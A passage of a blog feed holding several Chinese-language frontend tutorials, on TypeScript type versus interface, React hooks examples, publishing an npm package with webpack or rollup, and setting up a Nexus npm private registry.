type</span><br><span class="line">type Name = &#123; </span><br><span class="line">  name: string; </span><br><span class="line">&#125;</span><br><span class="line">type User = Name &amp; &#123; age: number  &#125;;</span><br><span class="line"></span><br><span class="line">// interface extends type</span><br><span class="line">type Name = &#123; </span><br><span class="line">  name: string; </span><br><span class="line">&#125;</span><br><span class="line">interface User extends Name &#123; </span><br><span class="line">  age: number; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//  type extends interface</span><br><span class="line">interface Name &#123; </span><br><span class="line">  name: string; </span><br><span class="line">&#125;</span><br><span class="line">type User = Name &amp; &#123; </span><br><span class="line">  age: number; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h4><ul>
<li><p>type 可以声明基本类型别名，而interface不行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 基本类型别名</span><br><span class="line">type Name = string</span><br></pre></td></tr></table></figure>
</li>
<li><p>type 语句中还可以使用 typeof 获取实例的类型进行赋值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let div = document.createElement(&apos;div&apos;);</span><br><span class="line">type B = typeof div</span><br></pre></td></tr></table></figure>
</li>
<li><p>interface 可以声明合并，而type不行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">interface User &#123;</span><br><span class="line">  name: string</span><br><span class="line">  age: number</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface User &#123;</span><br><span class="line">  sex: string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* User 接口为 &#123;</span><br><span class="line">  name: string</span><br><span class="line">  age: number</span><br><span class="line">  sex: string </span><br><span class="line">&#125;*/</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Typescript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Typescript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[React]]></title>
      <url>https://fuzhongfeng.github.io/2020/09/25/react/</url>
      <content type="html"><![CDATA[<h1 id="React"><a href="#React" class="headerlink" title="React"></a>React</h1><h2 id="react-hooks"><a href="#react-hooks" class="headerlink" title="react-hooks"></a>react-hooks</h2><blockquote>
<h3 id="useState"><a href="#useState" class="headerlink" title="useState"></a>useState</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">const [state, setState] = useState(1)</span><br><span class="line"></span><br><span class="line">// 如果通过点击事件回调多次调用传入相同值会触发更新吗？</span><br><span class="line">// 答：不会，因为 React 使用 Object.is 比较算法来比较 state。如果传入值相同则会跳过更新。</span><br><span class="line">// 这一点与 class 组件的 setState 是不同的。</span><br><span class="line">const handleClick = () =&gt; &#123;</span><br><span class="line">  setState(1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 如果新的 state 需要通过使用先前的 state 计算得出，那么可以将函数传递给 setState。该函数将接收先前的 state，并返回一个更新后的值</span><br><span class="line">const handleClick = () =&gt; &#123;</span><br><span class="line">  // 调用多次后 count 会累加。</span><br><span class="line">  setState(pre =&gt; pre + 1)</span><br><span class="line">  setState(pre =&gt; pre + 1)</span><br><span class="line">  setState(pre =&gt; pre + 1)</span><br><span class="line"></span><br><span class="line">  // 调用多次后 count 只会增加 1</span><br><span class="line">  setState(count + 1)</span><br><span class="line">  setState(count + 1)</span><br><span class="line">  setState(count + 1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<h3 id="useMemo"><a href="#useMemo" class="headerlink" title="useMemo"></a>useMemo</h3><p>缓存计算存值，仅当依赖项变化时更新，减少不必要的重新计算。不传入依赖则每次都会更新，传入空数组则只更新一次。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function App() &#123;</span><br><span class="line">  const [count, setCount] = useState(1);</span><br><span class="line">  const [val, setValue] = useState(&apos;&apos;);</span><br><span class="line"></span><br><span class="line">  function getNum() &#123;</span><br><span class="line">    console.log(&apos;===getNum 函数执行了！===&apos;)</span><br><span class="line">    return Array.from(&#123; length: count * 100 &#125;, (v, i) =&gt; i).reduce((a, b) =&gt; a + b)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const memo = useMemo(getNum, [count]) // 返回的是最后的计算值, 依赖项如果传入的是空数组则永远不会重新计算。如果不指定第二个参数则每次刷新都会重新计算</span><br><span class="line"></span><br><span class="line">  return &lt;div&gt;</span><br><span class="line">    &lt;h4&gt;总和：&#123;memo&#125;&lt;/h4&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/button&gt;</span><br><span class="line">      &lt;input value=&#123;val&#125; onChange=&#123;event =&gt; setValue(event.target.value)&#125; /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<h3 id="useCallback"><a href="#useCallback" class="headerlink" title="useCallback"></a>useCallback</h3><p>缓存函数，仅当依赖项变化时更新函数，当把返回的缓存函数传递给经过优化的并使用引用相等性去避免非必要渲染（例如 shouldComponentUpdate）的子组件时，它将非常有用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function App() &#123;</span><br><span class="line">  const [count, setCount] = useState(1);</span><br><span class="line">  const [val, setValue] = useState(&apos;&apos;);</span><br><span class="line"></span><br><span class="line">  function computed() &#123;</span><br><span class="line">    console.log(&apos;===getNum===&apos;)</span><br><span class="line">    return Array.from(&#123; length: count * 100 &#125;, (v, i) =&gt; i).reduce((a, b) =&gt; a + b)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const getNum = useCallback(computed, [count]) // 返回函数</span><br><span class="line"></span><br><span class="line">  return &lt;div&gt;</span><br><span class="line">      &lt;Child getNum=&#123;getNum&#125; /&gt;</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">          &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/button&gt;</span><br><span class="line">          &lt;input value=&#123;val&#125; onChange=&#123;event =&gt; setValue(event.target.value)&#125;/&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const Child = React.memo(function (&#123; getNum &#125;) &#123;</span><br><span class="line">  return &lt;h4&gt;总和：&#123;getNum()&#125;&lt;/h4&gt;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<h3 id="useReducer"><a href="#useReducer" class="headerlink" title="useReducer"></a>useReducer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import React, &#123; useReducer &#125; from &apos;react&apos;;</span><br><span class="line">import Child from &apos;./child&apos;</span><br><span class="line">import &#123; MyContext &#125; from &apos;./context&apos;;</span><br><span class="line"></span><br><span class="line">function App() &#123;</span><br><span class="line">  // dispatch 是稳定的标识，每次更新不会被改变。</span><br><span class="line">  const [reduceNum, dispatch] = useReducer(reducer, &#123;num: 1&#125;)</span><br><span class="line"></span><br><span class="line">  function reducer(state, action) &#123;</span><br><span class="line">    switch (action.type) &#123;</span><br><span class="line">      case &apos;set999&apos;:</span><br><span class="line">        return &#123;num: 999&#125;;</span><br><span class="line">      case &apos;set666&apos;:</span><br><span class="line">        return &#123;num: 666&#125;;</span><br><span class="line">      default:</span><br><span class="line">        throw new Error();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;MyContext.Provider value=&#123;&#123; reduceNum, dispatch&#125;&#125;&gt;</span><br><span class="line">        &lt;Child&gt;&lt;/Child&gt;</span><br><span class="line">        &lt;div&gt;这里是父组件的reduceNum：&#123;reduceNum.num&#125;&lt;/div&gt;</span><br><span class="line">      &lt;/MyContext.Provider&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import React, &#123; useContext, useReducer &#125; from &apos;react&apos;;</span><br><span class="line">import &#123; MyContext &#125; from &apos;./context&apos;</span><br><span class="line"></span><br><span class="line">function Child2() &#123;</span><br><span class="line">  // 读取 MyContext.Provider 的 value 属性值。</span><br><span class="line">  // dispatch 为 useReducer 创建，避免了层层传递回调函数，且标识稳定</span><br><span class="line">  const &#123; dispatch, reduceNum &#125; = useContext(MyContext)</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;button onClick=&#123;() =&gt; dispatch(&#123; type: &apos;set999&apos; &#125;)&#125;&gt;set999&lt;/button&gt;</span><br><span class="line">      &lt;button onClick=&#123;() =&gt; dispatch(&#123; type: &apos;set666&apos; &#125;)&#125;&gt;set666&lt;/button&gt;</span><br><span class="line">      &lt;div&gt;这里是子组件的reduceNum：&#123;reduceNum.num&#125;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default Child2;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import React, &#123; createContext &#125; from &apos;react&apos;;</span><br><span class="line"></span><br><span class="line">export const MyContext = createContext(&#123;</span><br><span class="line">  count: 111,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<blockquote>
<h3 id="useLayoutEffect"><a href="#useLayoutEffect" class="headerlink" title="useLayoutEffect"></a>useLayoutEffect</h3><p>dom 更新之后调用。但会在浏览器绘制之前同步执行完 useLayoutEffect 内部的代码，因此会阻塞浏览器的渲染<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function Child() &#123;</span><br><span class="line">  const [n, setN] = useState(0)</span><br><span class="line"></span><br><span class="line">  useLayoutEffect(() =&gt; &#123;</span><br><span class="line">    var n = 10000;</span><br><span class="line">    while(n-- &gt; 0) &#123;</span><br><span class="line">      console.log(n)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;button onClick=&#123;() =&gt; &#123;setN(n + 1)&#125;)&#125;&gt;点击&lt;/button&gt;</span><br><span class="line">      // while 循环结束后才会添加动画</span><br><span class="line">      &lt;div className=&#123;`container $&#123;n === 1 ? &apos;animate&apos; : &apos;&apos;&#125;`&#125;&gt;&#123;n&#125;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<h3 id="hooks-中的闭包问题"><a href="#hooks-中的闭包问题" class="headerlink" title="hooks 中的闭包问题"></a>hooks 中的闭包问题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function App() &#123;</span><br><span class="line">  const [count, setCount]  = useState(1)</span><br><span class="line"></span><br><span class="line">  // 闭包的bug</span><br><span class="line">  // 所意官方要求每次useEffect内部用到的遍历都要放在依赖项数组中，否则不是最新</span><br><span class="line">  useEffect(() =&gt; &#123;</span><br><span class="line">    setInterval(() =&gt; &#123;&apos;</span><br><span class="line">      // 每次获取到的都是初始值1</span><br><span class="line">      console.log(&apos;setInerval count:&apos;, count)</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">  &#125;, [])</span><br><span class="line"></span><br><span class="line">  const handleClick = () =&gt; &#123;</span><br><span class="line">    setCount(per =&gt; per + 1)</span><br><span class="line">    // count 值每次 +1</span><br><span class="line">    console.log(&apos;handleClick count:&apos;, count)</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  return(</span><br><span class="line">    &lt;button onClick=&#123;handleClick&#125;&gt;按钮&lt;/button&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<h3 id="React-memo"><a href="#React-memo" class="headerlink" title="React.memo"></a>React.memo</h3><p>为高阶组件, 可接受 <strong>Component</strong> 组件和<strong>函数</strong>组件，这里注意两种都可使用！！！。返回值为 react 组件。所以适用于 prop 值简单的情况</p>
</blockquote>
<blockquote>
<h3 id="PureComponent"><a href="#PureComponent" class="headerlink" title="PureComponent"></a>PureComponent</h3><p>相当于在 shouldComponentUpdate() 中对 prop 和 state 进行了浅比较。所以适用于 prop 值简单的情况</p>
<ol>
<li>在 Component 组件。多次 setState 相同值时，每次都会渲染吗？在 pureComponent 中会有不同吗？<br>答：Component 多次 setState 相同值时仍然会调用到 render 函数。可在 shouldComponentUpdate 中优化。<br>pureComponent 多次 setState 相同值时<strong>不会</strong>调用 render 函数。</li>
</ol>
</blockquote>
]]></content>
      
        <categories>
            
            <category> React </category>
            
        </categories>
        
        
        <tags>
            
            <tag> React </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[发布一个 npm 包]]></title>
      <url>https://fuzhongfeng.github.io/2019/10/31/npm-publish/</url>
      <content type="html"><![CDATA[<h1 id="发布一个-npm-包"><a href="#发布一个-npm-包" class="headerlink" title="发布一个 npm 包"></a>发布一个 npm 包</h1><blockquote>
<p>最近在做项目的 SDK，需要将开发好的 SDK 包发布到 npm 私服上，其他项目使用时可以通过 npm install 安装并通过 import 语法引入使用。</p>
</blockquote>
<h2 id="webpack-打包-SDK（不推荐）"><a href="#webpack-打包-SDK（不推荐）" class="headerlink" title="webpack 打包 SDK（不推荐）"></a>webpack 打包 SDK（不推荐）</h2><blockquote>
<p>通过 script 脚本方式引入可以通过在 window 上添加属性并获取脚本内容，那么如果想通过 import、require 引入该如何打包呢？其实通过 webpack 配置来打包即可实现</p>
</blockquote>
<ol>
<li><p>将所有需要导出的模块引入到一个文件中并导出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// ./src/index.ts 文件</span><br><span class="line">import EditorSDK from &apos;./editor/index&apos;</span><br><span class="line">import PlayerSDK from &apos;./player/index&apos;</span><br><span class="line"></span><br><span class="line">export default &#123; EditorSDK, PlayerSDK &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置 entry 和 output.libraryTarget 选项：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">    entry: &apos;./src/index.ts&apos;, // 项目的入口文件</span><br><span class="line">    output: &#123;</span><br><span class="line">        library: &apos;MyLibrary&apos;,</span><br><span class="line">        libraryTarget: &apos;umd&apos;,</span><br><span class="line">        globalObject: &apos;this&apos;, // node 和 浏览器都能获取到</span><br><span class="line">        libraryExport: &quot;default&quot;, // 将模块的default默认暴露，如果不指定自参数则需要获取window.MyLibrary.default（对应上文 export default），指定后window.MyLibrary即可获取到。</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li><p>将模块包通过所有模块化方式暴露，因此可通过 CommonJS、AMD、ES2015 规范或作为全局变量使用。打包后的输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(function webpackUniversalModuleDefinition(root, factory) &#123;</span><br><span class="line">  if(typeof exports === &apos;object&apos; &amp;&amp; typeof module === &apos;object&apos;)</span><br><span class="line">    module.exports = factory();</span><br><span class="line">  else if(typeof define === &apos;function&apos; &amp;&amp; define.amd)</span><br><span class="line">    define([], factory);</span><br><span class="line">  else if(typeof exports === &apos;object&apos;)</span><br><span class="line">    exports[&apos;MyLibrary&apos;] = factory();</span><br><span class="line">  else</span><br><span class="line">    root[&apos;MyLibrary&apos;] = factory();</span><br><span class="line">&#125;)(typeof self !== &apos;undefined&apos; ? self : this, function() &#123;</span><br><span class="line">  return _entry_return_;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置 externals 选项：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 此选项可以将库中依赖的第三方不包含在打包生成的 bundle 文件中，从而减小发布包的体积</span><br><span class="line">module.exports = &#123;</span><br><span class="line">  externals: &apos;events&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="rollup-打包（推荐）"><a href="#rollup-打包（推荐）" class="headerlink" title="rollup 打包（推荐）"></a>rollup 打包（推荐）</h2><p>rollup 对于 tree-shaking 支持较好，一些前端流行都是用 rollup 打包，下面罗列一些开发中遇到的点：</p>
<ol>
<li>rollup 支持 umd 和 es 两种打包方式分别对应 package.json 中的 main 和 module 字段，直接 import 时会使用 es 文件对 tree-shaking 执行更好。</li>
<li>d.ts 声明文件如何生成？<br>可以通 tsconfig.json 中的 compilerOptions.declarationDir 字段指定文件夹目录如：dist/types。<br>通过 rollup-plugin-typescript2 插件生成，通过配置 useTsconfigDeclarationDir: true 读取。<br>注意如果使用了rollup-plugin-typescript2不指定声明文件目录也会生成声明文件但目录结构比较混乱。</li>
<li>external 排除引用的第三方包减少当前包的体积。<br>建议规范使用 package.json 字段，dependencies 字段中添加生产环境必须的依赖包，这样安装当前包的时候也会将 dependencies 内需要的包添加到使用的项目内。此选项建议直接读取 package.json dependencies。</li>
<li>为什么 rollup 对 tree-shaking 支持更好？<br>因为rollup基于显式的 import 和 export 语句的方式解析（不需要第三方 babel）。比在编译后的输出代码中，简单地运行自动 minifier 检测未使用的变量更有效（个人理解是webpack只会检测babel处理后的代码）。</li>
<li>rollup 不需要 babel 编译新特性代码，自身就可以处理。（官网：Rollup itself processes the config file, which is why we’re able to use export default syntax – the code isn’t being transpiled with Babel or anything similar, so you can only use ES2015 features that are supported in the version of Node.js that you’re running）。有利于 tree-shaking</li>
</ol>
<h2 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h2><ul>
<li>version 版本号发布时不能与已有的重复。</li>
<li>dependencies 和 devDependencies<br>一直说开发环境的包要放到 devDependencies 中、生产环境的把放到 dependencies。但即使混淆也并不影响项目打包，对于平时开发似乎没什么影响。但作为包发布却有很大的差别，<strong>dependencies 里的依赖用 npm 安装的时候会自动添加到 node_modules 中，webpack externals 或 roolup external 中配置后可不打包在 bundle 中，减小包的体积。</strong></li>
<li>peerDependencies<br><strong>字段指定的包在npm install 时不会在自动安装到当前宿主环境。</strong></li>
</ul>
<h2 id="2-npm-publish-发布"><a href="#2-npm-publish-发布" class="headerlink" title="2. npm publish 发布"></a>2. npm publish 发布</h2><blockquote>
<p>通过 npm publish 发布时只需要将编译过的 dist 目录发布即可。此时可配置 package.json 下的 files 字段。（此时只会将 dist 文件夹以及根目录下的 README.md 发布）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;fuzhongfeng-test-slide-sdk&quot;, // npm 包的名称，install 时使用</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;, // 每次 npm publish 时需要与线上的版本号不同才能发布</span><br><span class="line">  &quot;description&quot;: &quot;slide-sdk publish&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;/dist/bundle.js&quot;, // 指定模块ID为程序的主入口。如果包的名称为 foo 并且用户安装了此包，然后又执行 require（&quot;foo&quot;)，则返回主模块所导出的对象。</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;files&quot;: [&quot;dist&quot;], // 指定需要发布的文件夹目录，这样不会将开发代码也发布上去</span><br><span class="line">  &quot;typings&quot;: &quot;dist/index.d.ts&apos;, // 指定 ts 项目的申明文件</span><br><span class="line">  &quot;keywords&quot;: [],</span><br><span class="line">  &quot;author&quot;: &quot;&quot;,</span><br><span class="line">  &quot;license&quot;: &quot;ISC&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<ul>
<li><p>根目录下执行 <code>npm publish</code> 发布</p>
</li>
<li><p>在其他项目中执行 <code>npm install -i fuzhongfeng-test-slide-sdk</code> 安装模块，并可通过 import、require 方式引入</p>
</li>
</ul>
<p>本文参考：<a href="https://webpack.js.org/guides/author-libraries/" target="_blank" rel="noopener">https://webpack.js.org/guides/author-libraries/</a></p>
]]></content>
      
        <categories>
            
            <category> npm </category>
            
        </categories>
        
        
        <tags>
            
            <tag> npm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[npm 私服搭建]]></title>
      <url>https://fuzhongfeng.github.io/2019/10/24/npm-private/</url>
      <content type="html"><![CDATA[<h1 id="Nexus-npm-私服搭建"><a href="#Nexus-npm-私服搭建" class="headerlink" title="Nexus npm 私服搭建"></a>Nexus npm 私服搭建</h1><blockquote>
<p>利用 Nexus3 进行 npm 的私服搭建</p>
</blockquote>
<h2 id="安装及启动服务"><a href="#安装及启动服务" class="headerlink" title="安装及启动服务"></a>安装及启动服务</h2><h4 id="1-Nexus3-需依赖-java8-环境。"><a href="#1-Nexus3-需依赖-java8-环境。" class="headerlink" title="1.  Nexus3 需依赖 java8 环境。"></a>1.  Nexus3 需依赖 java8 环境。</h4><ul>
<li><p>检测java版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$java -version</span><br></pre></td></tr></table></figure>
</li>
<li><p>如已安装 java8 则显示信息如下：<code>java version &quot;1.8.0_231&quot;</code></p>
</li>
</ul>
<h4 id="2-点击-此处-下载-Nexus"><a href="#2-点击-此处-下载-Nexus" class="headerlink" title="2. 点击 此处 下载 Nexus"></a>2. 点击 <a href="https://www.sonatype.com/download-oss-sonatype" target="_blank" rel="noopener">此处</a> 下载 Nexus</h4><h4 id="3-在任意目录下解压，进入解压后的文件夹为nexus-3-19-1-01-mac"><a href="#3-在任意目录下解压，进入解压后的文件夹为nexus-3-19-1-01-mac" class="headerlink" title="3. 在任意目录下解压，进入解压后的文件夹为nexus-3.19.1-01-mac"></a>3. 在任意目录下解压，进入解压后的文件夹为<code>nexus-3.19.1-01-mac</code></h4><h4 id="4-启动-Nexus-Repository-Manager-服务"><a href="#4-启动-Nexus-Repository-Manager-服务" class="headerlink" title="4. 启动  Nexus Repository Manager 服务"></a>4. 启动  Nexus Repository Manager 服务</h4><ul>
<li>输入命令:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd nexus-3.19.1-01/bin</span><br><span class="line"></span><br><span class="line">sudo ./nexus run</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="5-访问-http-127-0-0-1-8081"><a href="#5-访问-http-127-0-0-1-8081" class="headerlink" title="5. 访问 http://127.0.0.1:8081/"></a>5. 访问 <a href="http://127.0.0.1:8081/" target="_blank" rel="noopener">http://127.0.0.1:8081/</a></h4><h4 id="6-点击右上角的登录。"><a href="#6-点击右上角的登录。" class="headerlink" title="6. 点击右上角的登录。"></a>6. 点击右上角的登录。</h4><ul>
<li>用户名：admin</li>
<li>密码：根据提示框找到对应的文件即可复制，也可按照提示修改密码</li>
</ul>
<h2 id="添加npm仓库"><a href="#添加npm仓库" class="headerlink" title="添加npm仓库"></a>添加npm仓库</h2><blockquote>
<p>点击<code>Create repository</code>按钮创建如下三个仓库。</p>
</blockquote>
<h4 id="1-选择-npm-proxy-进入并填写字段："><a href="#1-选择-npm-proxy-进入并填写字段：" class="headerlink" title="1. 选择 npm(proxy) 进入并填写字段："></a>1. 选择 npm(proxy) 进入并填写字段：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name: npm-proxy</span><br><span class="line">remote storage : https://registry.npmjs.org  // 或设置为https://registry.npm.taobao.org，此字段为包请求的代理地址</span><br></pre></td></tr></table></figure>
<ul>
<li>点击保存</li>
</ul>
<h4 id="2-选择-npm-hosted-填写字段并保存："><a href="#2-选择-npm-hosted-填写字段并保存：" class="headerlink" title="2. 选择 npm(hosted) 填写字段并保存："></a>2. 选择 npm(hosted) 填写字段并保存：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name: npm-hosted // 用于存放私有包</span><br></pre></td></tr></table></figure>
<ul>
<li>点击保存</li>
</ul>
